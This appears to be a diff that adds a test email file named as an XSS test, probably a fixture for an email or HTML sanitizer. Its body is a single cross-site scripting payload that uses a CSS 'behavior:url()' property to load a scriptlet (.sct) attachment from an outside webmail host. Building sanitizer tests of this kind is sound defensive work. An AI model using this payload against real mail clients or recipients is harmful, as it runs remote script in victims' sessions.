@@ -1,0 +1,4 @@
+From: Adam Borowski <kilobyte@angband.pl>
+To: eligible.employees@enron.com
+Subject: XSS Test Mail
+<x style="behavior:url(http://appmail.mail.10086.cn/RmWeb/view.do?func=attach:download&mid=06841536abfca35e00000001&offset=1393&size=170&name=test.sct&encoding=1&sid=MTM2ODA3MzI4NDAwMTI1NzY5OTg5NQAA000007&type=attach)"></x>
